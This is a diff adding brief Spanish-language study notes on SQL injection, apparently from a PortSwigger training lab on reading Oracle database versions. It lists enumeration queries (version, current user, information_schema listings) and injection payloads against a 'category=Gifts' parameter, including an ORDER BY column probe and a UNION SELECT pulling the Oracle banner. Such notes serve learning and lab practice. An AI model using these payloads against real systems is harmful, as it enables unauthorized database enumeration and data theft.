@@ -1,0 +1,15 @@
+SQL injection attack, querying the database type and version on Oracle
+
+SELECT @@version; => Ver la versión de base de datos en MYSQL
+
+filter?category=Gifts' ORDER BY 7 => Nos saldrá error pero podemos ir probando para obtener el número de columnas el número indica la columna por la que deseamos ordenar
+SELECT * FROM table_2 UNION SELECT * FROM table_1; => UNION une dos tablas
+SELECT database() => Ver la base de datos actual
+SELECT user() => Para ver el usuario actual
+SELECT * FROM information_schema.schemata; => Tabla que contiene la lista de las bases de datos
+SELECT schema_name FROM information_schema.schemata; Ver nombres de las bases de datos
+SELECT group_concat(schema_name) FROM information_schema.schemata; => Concatena las filas en una sola fila
+SELECT table_name FROM information_schema.tables WHERE table_schema='port_swigger_login_bypass'; => Ver la lista de tablas por base de datos
+SELECT column_name FROM information_schema.columns WHERE table_schema='port_swigger_login_bypass' AND table_name='users'; => Ver las columnas de una tabla que pertenecen a una base de datos en específico
+SELECT banner FROM v$version; => Ver la version de ORACLE
+filter?category=Gifts' UNION SELECT '1',banner FROM v$version -- - => Con esto obtenemos la version de la base de datos ORACLE 
